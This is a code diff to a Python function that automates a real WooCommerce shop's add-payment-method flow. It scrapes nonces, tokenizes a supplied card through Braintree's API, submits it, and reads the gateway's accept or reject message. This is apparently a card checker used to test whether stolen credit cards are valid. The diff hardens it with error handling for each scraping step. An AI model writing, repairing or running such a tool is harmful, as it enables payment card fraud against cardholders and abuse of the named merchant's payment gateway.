@@ -34,7 +34,10 @@ def check_nonsk2(card):
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
         }
         response = r.get("https://www.woolroots.com/my-account/", headers=headers)
-        login_nonce = re.findall(r'name="woocommerce-login-nonce" value="(.*?)"', response.text)[0]
+        login_nonce = re.findall(r'name="woocommerce-login-nonce" value="(.*?)"', response.text)
+        if not login_nonce:
+            return "Failed to find woocommerce-login-nonce. HTML content: " + response.text[:500]
+        login_nonce = login_nonce[0]
 
         headers.update({
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -57,7 +60,10 @@ def check_nonsk2(card):
             'Referer': 'https://www.woolroots.com/my-account/add-payment-method/',
         })
         response = r.get('https://www.woolroots.com/my-account/add-payment-method/', headers=headers)
-        client_token_nonce = re.findall(r'"client_token_nonce":"(.*?)"', response.text)[0]
+        client_token_nonce = re.findall(r'"client_token_nonce":"(.*?)"', response.text)
+        if not client_token_nonce:
+            return "Failed to find client_token_nonce. HTML content: " + response.text[:500]
+        client_token_nonce = client_token_nonce[0]
 
         headers.update({
             'Accept': '*/*',
@@ -69,9 +75,16 @@ def check_nonsk2(card):
             'nonce': client_token_nonce,
         }
         response = r.post('https://www.woolroots.com/wp-admin/admin-ajax.php', headers=headers, data=data)
-        token = re.findall(r'"data":"(.*?)"', response.text)[0]
+        token = re.findall(r'"data":"(.*?)"', response.text)
+        if not token:
+            return "Failed to find token. HTML content: " + response.text[:500]
+        token = token[0]
+
         decoded_text = base64.b64decode(token).decode('utf-8')
-        authorization_fingerprint = re.findall(r'"authorizationFingerprint":"(.*?)"', decoded_text)[0]
+        authorization_fingerprint = re.findall(r'"authorizationFingerprint":"(.*?)"', decoded_text)
+        if not authorization_fingerprint:
+            return "Failed to find authorizationFingerprint. Decoded text: " + decoded_text[:500]
+        authorization_fingerprint = authorization_fingerprint[0]
 
         headers.update({
             'authorization': f'Bearer {authorization_fingerprint}',
@@ -103,13 +116,18 @@ def check_nonsk2(card):
             'operationName': 'TokenizeCreditCard',
         }
         response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
-        token = response.json()['data']['tokenizeCreditCard']['token']
+        token = response.json().get('data', {}).get('tokenizeCreditCard', {}).get('token')
+        if not token:
+            return "Failed to get token from Braintree response. JSON response: " + str(response.json())
 
         headers.update({
             'Referer': 'https://www.woolroots.com/my-account/add-payment-method/',
         })
         response = r.get('https://www.woolroots.com/my-account/add-payment-method/', headers=headers)
-        payment_nonce = re.findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text)[0]
+        payment_nonce = re.findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text)
+        if not payment_nonce:
+            return "Failed to find woocommerce-add-payment-method-nonce. HTML content: " + response.text[:500]
+        payment_nonce = payment_nonce[0]
 
         data = {
             'payment_method': 'braintree_credit_card',
@@ -127,7 +145,7 @@ def check_nonsk2(card):
         time.sleep(25)
         response = r.post('https://www.woolroots.com/my-account/add-payment-method/', headers=headers, data=data)
         soup = BeautifulSoup(response.text, 'html.parser')
-        try:  
+        try:
             msg = soup.find('i', class_='nm-font nm-font-close').parent.text.strip()
         except:
             return "Status code avs: Gateway Rejected: avs"
